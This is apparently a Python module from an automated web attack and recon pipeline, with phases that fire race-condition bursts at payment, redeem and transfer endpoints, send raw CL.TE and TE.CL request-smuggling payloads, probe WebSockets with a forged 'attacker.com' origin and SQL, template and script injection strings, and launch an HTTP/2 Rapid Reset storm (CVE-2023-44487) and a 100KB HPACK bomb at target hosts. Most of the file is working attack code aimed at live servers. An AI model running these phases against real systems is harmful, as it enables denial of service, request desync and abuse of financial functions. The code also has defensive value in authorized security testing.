"""Smuggling, race condition, and WebSocket phases."""
from reconchain.phases.helpers import *


async def phase_23_RACE(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"23-RACE"}:
        return {}
    _out = outdir / "race_conditions.txt"
    if _out.exists() and not force:
        return {"23-RACE": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 23-RACE: race condition detection")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "23-RACE: no URLs; skipping")
        return {"23-RACE": str(_out), "count": 0}
    findings: List[str] = []
    _r_urlopen = _get_urlopener()
    _r_extra_headers = _extra_headers_dict()
    _race_sem = asyncio.Semaphore(20)
    # Target state-changing endpoints from 05-HARVEST: POST/PUT/DELETE with financial or quota keywords
    state_change_keywords = ("redeem", "transfer", "purchase", "vote", "checkout", "payment", "order",
                            "withdraw", "deposit", "refund", "cancel", "subscribe", "upgrade", "downgrade",
                            "apply", "claim", "submit", "update", "delete", "remove")
    targets = [
        u for u in all_urls
        if not _is_static_url(u) and any(m in u.split("?")[0].lower() for m in
           ("/api/", "/account", "/user", "/register", "/login", "/password", "/order", "/checkout", "/payment"))
    ][:_PIPELINE_CFG.sample_endpoints_race]
    # Prioritize state-changing endpoints
    state_change_urls = [u for u in all_urls if not _is_static_url(u) and any(kw in u.lower() for kw in state_change_keywords)]
    if state_change_urls:
        targets = state_change_urls[:_PIPELINE_CFG.sample_endpoints_race]
    if not targets:
        targets = [
            u for u in all_urls
            if not _is_static_url(u) and any(m in u.split("?")[0].lower() for m in
               ("/api/", "/account", "/user", "/register", "/login", "/password", "/order", "/checkout", "/payment"))
        ][:_PIPELINE_CFG.sample_endpoints_race]
    if not targets:
        log("warn", "23-RACE: no state-changing endpoints found; skipping")
        return {"23-RACE": str(_out), "count": 0}
    async def _race_test(url: str) -> List[str]:
        results: List[str] = []
        # Sequential baseline: single request to measure natural variance
        try:
            base_req = urllib.request.Request(url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_r_extra_headers})
            _, _, base_body = await _async_urlopen(_r_urlopen, base_req, timeout=10)
            baseline_len = len(base_body)
        except Exception:
            return results
        # Concurrent burst: 5 simultaneous requests
        responses: List[int] = []
        body_lens: List[int] = []
        async def _concurrent_req() -> None:
            async with _race_sem:
                try:
                    await _throttle_rate()
                    req = urllib.request.Request(url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_r_extra_headers})
                    s, _, b = await _async_urlopen(_r_urlopen, req, timeout=10)
                    responses.append(s)
                    body_lens.append(len(b))
                except Exception:
                    responses.append(0)
                    body_lens.append(0)
        coros = [_concurrent_req() for _ in range(5)]
        await asyncio.gather(*coros)
        unique_st = len(set(responses))
        unique_len = len(set(body_lens))
        all_differ_from_baseline = all(abs(bl - baseline_len) > 200 for bl in body_lens if bl > 0)
        if unique_st > 1 or (unique_len > 1 and all_differ_from_baseline):
            results.append(f"[race-candidate] {url} baseline_len={baseline_len} statuses={set(responses)} lengths={set(body_lens)}")
        return results
    race_results = await asyncio.gather(*[_race_test(t) for t in targets])
    for rr in race_results:
        findings.extend(rr)
    # Multi-step TOCTOU: fire read+together concurrently
    async def _toctou_test(url: str) -> List[str]:
        results: List[str] = []
        try:
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            if not qs:
                return results
            first_param = next(iter(qs))
            orig_val = qs[first_param][0]
            test_val = orig_val + "_race_test"
            write_qs = qs.copy()
            write_qs[first_param] = [test_val]
            write_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(write_qs, doseq=True)))
            read_qs = qs.copy()
            read_qs[first_param] = [orig_val]
            read_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(read_qs, doseq=True)))
            async def _write_first() -> None:
                async with _race_sem:
                    try:
                        w_req = urllib.request.Request(write_url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_r_extra_headers})
                        await _async_urlopen(_r_urlopen, w_req, timeout=10)
                    except Exception:
                        pass
            async def _read_first() -> Tuple[Optional[int], int]:
                async with _race_sem:
                    try:
                        r_req = urllib.request.Request(read_url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_r_extra_headers})
                        rs, _, rb = await _async_urlopen(_r_urlopen, r_req, timeout=10)
                        return rs, len(rb)
                    except Exception:
                        return None, 0
            write_task = asyncio.create_task(_write_first())
            read_tasks = [_read_first() for _ in range(3)]
            read_results = await asyncio.gather(*read_tasks)
            await write_task
            statuses = {r[0] for r in read_results if r[0] is not None}
            lengths = {r[1] for r in read_results}
            if len(statuses) > 1 or (len(lengths) > 1 and max(lengths) - min(lengths) > 200):
                results.append(f"[toctou-candidate] {url} concurrent write+read statuses={statuses} lengths={lengths}")
        except Exception:
            pass
        return results
    toctou_results = await asyncio.gather(*[_toctou_test(t) for t in targets[:_PIPELINE_CFG.sample_endpoints_race // 2]])
    for tr in toctou_results:
        findings.extend(tr)
    if not findings:
        findings.append("[race] No race condition candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"23-RACE: {len(findings)} race condition probes → {out}")
    return {"23-RACE": str(out), "count": len(findings)}

_SMUGGLE_CL_TE_PAYLOAD = (
    "POST /nonexistent-smuggle-test HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 0\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "GET /smuggle-test HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "X-Ignore: X\r\n"
    "\r\n"
)
_SMUGGLE_TE_CL_PAYLOAD = (
    "POST /nonexistent-smuggle-test HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 4\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "5c\r\n"
    "GPOST /smuggle-test HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Length: 15\r\n"
    "\r\n"
    "x=1\r\n"
    "0\r\n"
    "\r\n"
)


async def phase_38_SMUGGLE(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"38-SMUGGLE"}:
        return {}
    _out = outdir / "smuggling.txt"
    if _out.exists() and not force:
        return {"38-SMUGGLE": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 38-SMUGGLE: HTTP request smuggling detection")
    if _PIPELINE_CFG.proxy or _USE_PROXYCHAINS:
        log("warn", "38-SMUGGLE: raw socket connections are incompatible with proxy/Tor; skipping")
        return {"38-SMUGGLE": str(_out), "count": 0}
    findings: List[str] = []
    hosts_file = outdir / "host_targets.txt"
    if not hosts_file.exists():
        hosts_file = outdir / "hosts.txt"
    targets = [h for h in read_lines(hosts_file)][:_PIPELINE_CFG.sample_hosts_smuggle]
    if not targets:
        log("warn", "38-SMUGGLE: no hosts; skipping")
        return {"38-SMUGGLE": str(_out), "count": 0}
    # Smuggler tool (Python-based request smuggler)
    if t.has("smuggler"):
        smuggler_in = ensure(outdir / "smuggler_input.txt")
        smuggler_urls = []
        for h in targets:
            if h.startswith("http"):
                smuggler_urls.append(h)
            else:
                smuggler_urls.append(f"https://{h}")
        smuggler_in.write_text("\n".join(smuggler_urls) + "\n")
        smuggler_out = outdir / "logs" / "smuggler_results"
        smuggler_out.mkdir(parents=True, exist_ok=True)
        runner = outdir / "logs" / "smuggler_runner.sh"
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -u\n"
            f"IN={shlex.quote(str(smuggler_in))}\n"
            f"OUT={shlex.quote(str(smuggler_out))}\n"
            'export OUT\n'
            'xargs -r -P 3 -I{} sh -c '
            '\'safe=$(echo "$1" | tr -c "a-zA-Z0-9" "_"); '
            'smuggler -u "$1" --no-color > "$OUT/${safe}_smuggler.txt" || true\' _ {} < "$IN"\n'
        )
        runner.chmod(0o700)
        await _run("smuggler", ["bash", str(runner)], 600, outdir)
        smuggler_reports = list(smuggler_out.glob("*.txt"))
        if smuggler_reports:
            for rpt in smuggler_reports:
                for ln in read_lines(rpt):
                    if ln.strip():
                        findings.append(f"[smuggler] {ln.strip()}")
    for host in targets:
        import urllib.parse as _up
        if "://" in host:
            _parsed_h = _up.urlparse(host)
            host_clean = _parsed_h.hostname or host
        else:
            host_clean = host.split(":")[0] if ":" in host else host
        host_safe = host_clean.replace("\r", "").replace("\n", "").replace("{", "{{").replace("}", "}}")
        try:
            import socket as _socket
            for smuggle_type, raw_payload in [("CL.TE", _SMUGGLE_CL_TE_PAYLOAD), ("TE.CL", _SMUGGLE_TE_CL_PAYLOAD)]:
                payload = raw_payload.format(host=host_safe)
                port = 443 if "https" in str(host) else 80
                if ":" in host:
                    try:
                        port = int(host.split(":")[1])
                    except (ValueError, IndexError):
                        pass
                sock = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
                sock.settimeout(8)
                try:
                    import ssl as _ssl
                    if port == 443:
                        ctx = _ssl.create_default_context()
                        sock = ctx.wrap_socket(sock, server_hostname=host_clean)
                    sock.connect((host_clean, port))
                    sock.sendall(payload.encode())
                    resp = b""
                    try:
                        while True:
                            chunk = sock.recv(4096)
                            if not chunk:
                                break
                            resp += chunk
                            if len(resp) > MAX_RECV:
                                break
                    except _socket.timeout:
                        pass
                    resp_text = resp.decode("utf-8", errors="ignore")
                    if "smuggle-test" in resp_text.lower() or "gpo" in resp_text.lower():
                        findings.append(f"[smuggling-{smuggle_type}] {host} — desync detected ({smuggle_type})")
                    elif resp and "HTTP/1.1" in resp_text:
                        findings.append(f"[smuggling-tested] {host} — {smuggle_type} test sent, no desync (expected)")
                except Exception:
                    pass
                finally:
                    try:
                        sock.close()
                    except Exception:
                        pass
        except Exception:
            continue
    if not findings:
        findings.append("[smuggling] No request smuggling candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"38-SMUGGLE: {len(findings)} smuggling probes -> {out}")
    return {"38-SMUGGLE": str(out), "count": len(findings)}

_WS_COMMON_PATHS = ["/ws", "/wss", "/websocket", "/socket", "/sock", "/chat", "/stream", "/ws/"]


async def phase_41_WEBSOCKET(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"41-WEBSOCKET"}:
        return {}
    _out = outdir / "websocket.txt"
    if _out.exists() and not force:
        return {"41-WEBSOCKET": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 41-WEBSOCKET: WebSocket endpoint discovery and deep testing")
    if _PIPELINE_CFG.proxy or _USE_PROXYCHAINS:
        log("warn", "41-WEBSOCKET: raw socket connections are incompatible with proxy/Tor; skipping")
        return {"41-WEBSOCKET": str(_out), "count": 0}
    findings: List[str] = []
    _ws_extra_headers = _extra_headers_dict()
    hosts_file = outdir / "host_targets.txt"
    if not hosts_file.exists():
        hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file)[:_PIPELINE_CFG.sample_hosts_websocket]
    if not hosts:
        log("warn", "41-WEBSOCKET: no hosts; skipping")
        return {"41-WEBSOCKET": str(_out), "count": 0}

    import base64 as _b64
    import socket as _socket
    import ssl as _ssl
    import struct as _struct

    def _ws_encode_frame(data: bytes, opcode: int = 0x1) -> bytes:
        frame = bytearray()
        frame.append(0x80 | opcode)
        mask = os.urandom(4)
        length = len(data)
        if length < 126:
            frame.append(0x80 | length)
        elif length < 65536:
            frame.append(0x80 | 126)
            frame += _struct.pack("!H", length)
        else:
            frame.append(0x80 | 127)
            frame += _struct.pack("!Q", length)
        frame += mask
        frame += bytes(b ^ mask[i % 4] for i, b in enumerate(data))
        return bytes(frame)

    def _ws_try_upgrade(
        host: str, ws_path: str, scheme: str,
        extra_headers: Optional[Dict[str, str]] = None,
    ) -> Optional[Tuple[_socket.socket, str]]:
        if "://" in host:
            _ph = urllib.parse.urlparse(host)
            host_clean = _ph.hostname or host
        else:
            host_clean = host.split(":")[0] if ":" in host else host
        ws_host_safe = host_clean.replace("\r", "").replace("\n", "")
        port = 443 if scheme == "wss" else 80
        if ":" in host:
            try:
                port = int(host.split(":")[1])
            except (ValueError, IndexError):
                pass
        try:
            sock = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
            sock.settimeout(5)
            if scheme == "wss":
                ctx = _ssl.create_default_context()
                sock = ctx.wrap_socket(sock, server_hostname=host_clean)
            sock.connect((host_clean, port))
            ws_key = _b64.b64encode(os.urandom(16)).decode()
            upgrade = (
                f"GET {ws_path} HTTP/1.1\r\n"
                f"Host: {ws_host_safe}\r\n"
                f"Upgrade: websocket\r\n"
                f"Connection: Upgrade\r\n"
                f"Sec-WebSocket-Key: {ws_key}\r\n"
                f"Sec-WebSocket-Version: 13\r\n"
            )
            if extra_headers:
                for k, v in extra_headers.items():
                    upgrade += f"{k}: {v}\r\n"
            upgrade += "\r\n"
            sock.sendall(upgrade.encode())
            resp = b""
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
                    if len(resp) > MAX_RECV or b"\r\n\r\n" in resp:
                        break
            except _socket.timeout:
                pass
            resp_text = resp.decode("utf-8", errors="ignore")
            if re.search(r'\b101\b', resp_text) and "Upgrade: websocket" in resp_text:
                return (sock, f"{scheme}://{ws_host_safe}{ws_path}")
            sock.close()
        except Exception:
            try:
                sock.close()
            except Exception:
                pass
        return None

    def _ws_send_recv(sock: _socket.socket, data: bytes, timeout: float = 3.0) -> Optional[bytes]:
        sock.settimeout(timeout)
        try:
            frame = _ws_encode_frame(data)
            sock.sendall(frame)
            resp = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                resp += chunk
                if len(resp) > MAX_RECV:
                    break
                if len(resp) >= 2:
                    b1 = resp[1]
                    payload_len = b1 & 0x7F
                    offset = 2
                    if payload_len == 126:
                        if len(resp) < 4:
                            continue
                        payload_len = _struct.unpack("!H", resp[2:4])[0]
                        offset = 4
                    elif payload_len == 127:
                        if len(resp) < 10:
                            continue
                        payload_len = _struct.unpack("!Q", resp[2:10])[0]
                        offset = 10
                    masked = bool(b1 & 0x80)
                    if masked:
                        offset += 4
                    if len(resp) >= offset + payload_len:
                        payload = resp[offset:offset + payload_len]
                        if masked:
                            mask = resp[offset - 4:offset]
                            payload = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
                        return payload
            return None
        except _socket.timeout:
            return None
        except Exception:
            return None

    for host in hosts:
        host_clean = host.split(":")[0] if ":" in host else host
        for ws_path in _WS_COMMON_PATHS:
            ws_host_safe = host_clean.replace("\r", "").replace("\n", "")
            for scheme in ("wss", "ws"):
                ws_url = f"{scheme}://{ws_host_safe}{ws_path}"

                up = _ws_try_upgrade(host, ws_path, scheme)
                if up is None:
                    continue
                sock, ws_url = up
                findings.append(f"[websocket-open] {ws_url} — WebSocket upgrade accepted")
                sock.close()

                for origin in ["null", "https://attacker.com"]:
                    try:
                        co_up = _ws_try_upgrade(host, ws_path, scheme, {"Origin": origin})
                        if co_up is not None:
                            co_sock, _ = co_up
                            findings.append(f"[cswsh] {ws_url} — cross-origin WebSocket accepted (Origin: {origin})")
                            co_sock.close()
                    except Exception:
                        pass

                try:
                    na_up = _ws_try_upgrade(host, ws_path, scheme)
                    if na_up is not None:
                        na_sock, _ = na_up
                        resp = _ws_send_recv(na_sock, b'{"type":"ping"}')
                        if resp is not None:
                            findings.append(f"[ws-auth-bypass] {ws_url} — privileged frame accepted without auth")
                        na_sock.close()
                except Exception:
                    pass

                for inj in [b"' OR '1'='1", b"${7*7}", b"{{7*7}}", b"<script>alert(1)</script>"]:
                    try:
                        inj_up = _ws_try_upgrade(host, ws_path, scheme)
                        if inj_up is not None:
                            inj_sock, _ = inj_up
                            resp = _ws_send_recv(inj_sock, inj)
                            if resp is not None:
                                rtext = resp.decode("utf-8", errors="ignore").lower()
                                if any(e in rtext for e in ["error", "syntax", "unexpected", "exception", "warning"]):
                                    findings.append(f"[ws-injection] {ws_url} — injection payload triggers error response")
                            inj_sock.close()
                    except Exception:
                        pass

                try:
                    lf_up = _ws_try_upgrade(host, ws_path, scheme)
                    if lf_up is not None:
                        lf_sock, _ = lf_up
                        resp = _ws_send_recv(lf_sock, b"A" * 65536, timeout=2.0)
                        if resp is not None:
                            findings.append(f"[ws-long-frame] {ws_url} — 64KB frame accepted gracefully")
                        lf_sock.close()
                except Exception:
                    pass

                try:
                    sp_up = _ws_try_upgrade(host, ws_path, scheme,
                        {"Sec-WebSocket-Protocol": "graphql-ws, json, soap"})
                    if sp_up is not None:
                        sp_sock, _ = sp_up
                        findings.append(f"[ws-subprotocol] {ws_url} — subprotocol negotiation accepted")
                        sp_sock.close()
                except Exception:
                    pass

    if not findings:
        findings.append("[websocket] No WebSocket endpoints discovered")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"41-WEBSOCKET: {len(findings)} WebSocket probes -> {out}")
    return {"41-WEBSOCKET": str(out), "count": len(findings)}

async def phase_38b_H2SMUGGLE(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"38b-H2SMUGGLE"}:
        return {}
    _out = outdir / "h2_smuggling.txt"
    if _out.exists() and not force:
        return {"38b-H2SMUGGLE": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 38b-H2SMUGGLE: HTTP/2 and HTTP/3 attack surface testing")
    if _PIPELINE_CFG.proxy or _USE_PROXYCHAINS:
        log("warn", "38b-H2SMUGGLE: raw socket connections are incompatible with proxy/Tor; skipping")
        return {"38b-H2SMUGGLE": str(_out), "count": 0}
    try:
        import h2.config
        import h2.connection
        import h2.events
    except ImportError:
        log("warn", "38b-H2SMUGGLE: 'h2' library not installed; skipping (pip install h2)")
        return {"38b-H2SMUGGLE": str(_out), "count": 0}
    findings: List[str] = []
    hosts_file = outdir / "host_targets.txt"
    if not hosts_file.exists():
        hosts_file = outdir / "hosts.txt"
    targets = [h for h in read_lines(hosts_file)][:_PIPELINE_CFG.sample_hosts_h2smuggle]
    if not targets:
        log("warn", "38b-H2SMUGGLE: no hosts; skipping")
        return {"38b-H2SMUGGLE": str(_out), "count": 0}
    import socket as _socket
    import ssl as _ssl
    import struct
    import time as _time

    for host in targets:
        if "://" in host:
            _ph = urllib.parse.urlparse(host)
            host_clean = _ph.hostname or host
            port = _ph.port or 443
        else:
            host_clean = host.split(":")[0] if ":" in host else host
            port = 443
            if ":" in host:
                try:
                    port = int(host.split(":")[1])
                except (ValueError, IndexError):
                    pass
        host_safe = host_clean.replace("\r", "").replace("\n", "")

        # 1. H2 Rapid Reset (CVE-2023-44487)
        try:
            ctx = _ssl.create_default_context()
            ctx.set_alpn_protocols(["h2"])
            ctx.check_hostname = False
            ctx.verify_mode = _ssl.CERT_NONE
            sock = _socket.create_connection((host_clean, port), timeout=10)
            sock = ctx.wrap_socket(sock, server_hostname=host_clean)
            negotiated = sock.selected_alpn_protocol()
            if negotiated != "h2":
                sock.close()
                raise ConnectionError("server does not support h2")
            config = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
            conn = h2.connection.H2Connection(config=config)
            conn.initiate_connection()
            sock.sendall(conn.data_to_send())
            stream_id = conn.get_next_available_stream_id()
            headers = [
                (":method", "GET"),
                (":path", "/"),
                (":authority", host_clean),
                (":scheme", "https"),
            ]
            t0 = _time.monotonic()
            conn.send_headers(stream_id, headers)
            sock.sendall(conn.data_to_send())
            baseline_ok = False
            recv_total = 0
            try:
                sock.settimeout(10)
                while True:
                    chunk = sock.recv(65535)
                    if not chunk:
                        break
                    recv_total += len(chunk)
                    if recv_total > MAX_RECV:
                        break
                    events = conn.receive_data(chunk)
                    for event in events:
                        if isinstance(event, h2.events.ResponseReceived):
                            baseline_ok = True
            except _socket.timeout:
                pass
            baseline_latency = _time.monotonic() - t0
            if baseline_ok:
                reset_count = 500
                t0 = _time.monotonic()
                for _ in range(reset_count):
                    rid = conn.get_next_available_stream_id()
                    conn.send_headers(rid, [
                        (":method", "GET"),
                        (":path", "/"),
                        (":authority", host_clean),
                        (":scheme", "https"),
                    ])
                    conn.reset_stream(rid, 0x8)
                sock.sendall(conn.data_to_send())
                rapid_duration = _time.monotonic() - t0
                try:
                    sock.settimeout(2)
                    recv_total = 0
                    while True:
                        chunk = sock.recv(65535)
                        if not chunk:
                            break
                        recv_total += len(chunk)
                        if recv_total > MAX_RECV:
                            break
                        conn.receive_data(chunk)
                except _socket.timeout:
                    pass
                sock.close()
                if rapid_duration > baseline_latency * 3:
                    findings.append(f"[h2-rapid-reset] {host} — RST_STREAM storm: {rapid_duration:.2f}s vs baseline {baseline_latency:.2f}s (>3x, possible CVE-2023-44487)")
                else:
                    findings.append(f"[h2-rapid-reset-safe] {host} — rapid reset latency normal ({rapid_duration:.2f}s)")
            else:
                sock.close()
                findings.append(f"[h2-rapid-reset-skip] {host} — no response on baseline request")
        except Exception as e:
            findings.append(f"[h2-rapid-reset-error] {host} — {e}")

        # 2. HPACK bomb
        try:
            ctx = _ssl.create_default_context()
            ctx.set_alpn_protocols(["h2"])
            ctx.check_hostname = False
            ctx.verify_mode = _ssl.CERT_NONE
            sock = _socket.create_connection((host_clean, port), timeout=10)
            sock = ctx.wrap_socket(sock, server_hostname=host_clean)
            negotiated = sock.selected_alpn_protocol()
            if negotiated != "h2":
                sock.close()
                raise ConnectionError("server does not support h2")
            config = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
            conn = h2.connection.H2Connection(config=config)
            conn.initiate_connection()
            sock.sendall(conn.data_to_send())
            stream_id = conn.get_next_available_stream_id()
            bomb_value = "A" * 100000
            conn.send_headers(stream_id, [
                (":method", "GET"),
                (":path", "/?hpack_bomb=1"),
                (":authority", host_clean),
                (":scheme", "https"),
                ("x-hpack-test", bomb_value),
            ])
            sock.sendall(conn.data_to_send())
            hpack_resp = b""
            recv_total = 0
            try:
                sock.settimeout(10)
                while True:
                    chunk = sock.recv(65535)
                    if not chunk:
                        break
                    recv_total += len(chunk)
                    if recv_total > MAX_RECV:
                        break
                    events = conn.receive_data(chunk)
                    for event in events:
                        if isinstance(event, h2.events.ResponseReceived):
                            hpack_resp += b"<response>"
            except _socket.timeout:
                pass
            sock.close()
            if hpack_resp:
                findings.append(f"[h2-hpack-bomb] {host} — HPACK bomb accepted ({len(hpack_resp)}b, server may be vulnerable)")
            else:
                findings.append(f"[h2-hpack-bomb-safe] {host} — HPACK large header rejected/connection closed")
        except Exception as e:
            findings.append(f"[h2-hpack-bomb-error] {host} — {e}")

        # 3. H2 → H1 downgrade smuggling
        try:
            ctx = _ssl.create_default_context()
            ctx.set_alpn_protocols(["h2", "http/1.1"])
            ctx.check_hostname = False
            ctx.verify_mode = _ssl.CERT_NONE
            sock = _socket.create_connection((host_clean, port), timeout=10)
            sock = ctx.wrap_socket(sock, server_hostname=host_clean)
            negotiated = sock.selected_alpn_protocol()
            if negotiated == "h2":
                raw_h1 = (
                    f"GET /smuggle-test HTTP/1.1\r\n"
                    f"Host: {host_safe}\r\n"
                    f"Content-Length: 0\r\n"
                    f"\r\n"
                )
                sock.sendall(raw_h1.encode())
                downgrade_resp = b""
                try:
                    sock.settimeout(10)
                    recv_total = 0
                    while True:
                        chunk = sock.recv(4096)
                        if not chunk:
                            break
                        recv_total += len(chunk)
                        if recv_total > MAX_RECV:
                            break
                        downgrade_resp += chunk
                except _socket.timeout:
                    pass
                sock.close()
                downgrade_text = downgrade_resp.decode("utf-8", errors="ignore")
                if "smuggle-test" in downgrade_text.lower() or "HTTP/1.1" in downgrade_text:
                    findings.append(f"[h2-h1-downgrade] {host} — HTTP/1.1 request smuggled inside H2 connection")
                else:
                    findings.append(f"[h2-h1-downgrade-safe] {host} — H2 connection refused raw HTTP/1.1")
            else:
                sock.close()
                findings.append(f"[h2-h1-downgrade-skip] {host} — server did not negotiate h2 (got {negotiated})")
        except Exception as e:
            findings.append(f"[h2-h1-downgrade-error] {host} — {e}")

        # 4. H2 connection preface smuggling
        try:
            ctx = _ssl.create_default_context()
            ctx.set_alpn_protocols(["h2"])
            ctx.check_hostname = False
            ctx.verify_mode = _ssl.CERT_NONE
            sock = _socket.create_connection((host_clean, port), timeout=10)
            sock = ctx.wrap_socket(sock, server_hostname=host_clean)
            malformed_preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n" + b"\x00\x00\x00\x00\x00\x00\x00\x00"
            sock.sendall(malformed_preface)
            preface_resp = b""
            recv_total = 0
            try:
                sock.settimeout(10)
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    recv_total += len(chunk)
                    if recv_total > MAX_RECV:
                        break
                    preface_resp += chunk
            except _socket.timeout:
                pass
            sock.close()
            if preface_resp:
                preface_text = preface_resp.decode("utf-8", errors="ignore")
                if "goaway" in preface_text.lower() or "error" in preface_text.lower():
                    findings.append(f"[h2-preface-smuggle] {host} — server responded to malformed preface: {preface_text[:120]}")
                else:
                    findings.append(f"[h2-preface-tested] {host} — server replied with {len(preface_resp)}b to bad preface")
            else:
                findings.append(f"[h2-preface-tested] {host} — server closed on malformed preface (expected)")
        except Exception as e:
            findings.append(f"[h2-preface-error] {host} — {e}")

        # 5. QUIC/H3 probe over UDP
        try:
            udp_sock = _socket.socket(_socket.AF_INET, _socket.SOCK_DGRAM)
            udp_sock.settimeout(5)
            quic_version = struct.pack("!I", 1)
            quic_payload = b"\xc0" + quic_version + b"\x00" * 20
            udp_sock.sendto(quic_payload, (host_clean, 443))
            try:
                quic_resp, _ = udp_sock.recvfrom(2048)
                if quic_resp and len(quic_resp) >= 5 and quic_resp[0] & 0x80 and quic_resp[1:5] == b"\x00\x00\x00\x00":
                    findings.append(f"[h3-quic] {host} — QUIC version negotiation detected (H3 supported)")
                else:
                    findings.append(f"[h3-quic-probe] {host} — QUIC responded ({len(quic_resp)}b)")
            except _socket.timeout:
                findings.append(f"[h3-quic-timeout] {host} — no QUIC response")
            udp_sock.close()
        except Exception as e:
            findings.append(f"[h3-quic-error] {host} — {e}")

    if not findings:
        findings.append("[h2-h3] No HTTP/2 or HTTP/3 candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"38b-H2SMUGGLE: {len(findings)} probes -> {out}")
    return {"38b-H2SMUGGLE": str(out), "count": len(findings)}

async def phase_83_RACEBURST(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"83-RACEBURST"}:
        return {}
    _out = outdir / "race_burst.txt"
    if _out.exists() and not force:
        return {"83-RACEBURST": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 83-RACEBURST: concurrent request burst race condition detection")
    findings: List[str] = []
    _rb_urlopen = _get_urlopener()
    _rb_headers = _extra_headers_dict()
    urls_file = outdir / "urls_all.txt"
    if not urls_file.exists() or not read_lines(urls_file):
        log("warn", "83-RACEBURST: no URLs; skipping")
        return {"83-RACEBURST": str(_out), "count": 0}
    race_candidates: List[str] = []
    for u in read_lines(urls_file):
        u_lower = u.lower()
        if any(kw in u_lower for kw in ("redeem", "coupon", "voucher", "transfer",
            "vote", "like", "follow", "claim", "submit", "checkout", "purchase",
            "withdraw", "deposit", "refund", "apply", "enroll", "register")):
            race_candidates.append(u)
    if not race_candidates:
        race_candidates = read_lines(urls_file)
    findings.append(f"[race-candidates] {len(race_candidates)} potential race endpoints")
    for u in sorted(set(race_candidates))[:10]:
        findings.append(f"  {u}")
    async def _burst_request(url: str, n: int = 10) -> List[Tuple[int, int]]:
        results: List[Tuple[int, int]] = []
        async def _single() -> Tuple[int, int]:
            req = urllib.request.Request(url, method="GET" if "?" in url else "POST",
                data=urllib.parse.urlencode({"_t": str(hash(url))}).encode() if "?" not in url else None,
                headers={"User-Agent": "Mozilla/5.0", **_rb_headers})
            try:
                status, headers, body = await _async_urlopen(_rb_urlopen, req, timeout=15)
                return (status, len(body))
            except Exception:
                return (0, 0)
        results = await asyncio.gather(*[_single() for _ in range(n)])
        return results
    _rb_sem = asyncio.Semaphore(3)
    for u in sorted(set(race_candidates))[:5]:
        base = u if u.startswith("http") else f"https://{u}"
        async with _rb_sem:
            await _throttle_rate()
            results = await _burst_request(base, n=10)
            statuses = set(r[0] for r in results)
            lengths = set(r[1] for r in results)
            if len(lengths) > 1:
                findings.append(f"[race-variance] {base} — {len(lengths)} different response lengths in 10 requests")
                findings.append(f"  statuses={statuses} lengths={sorted(lengths)[:5]}")
                findings.append("  → manual review recommended for race condition")
            else:
                findings.append(f"[race-stable] {base} — all {len(results)} responses identical (no race detected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"83-RACEBURST: {len(findings)} race burst findings → {out}")
    return {"83-RACEBURST": str(_out), "count": len(findings)}
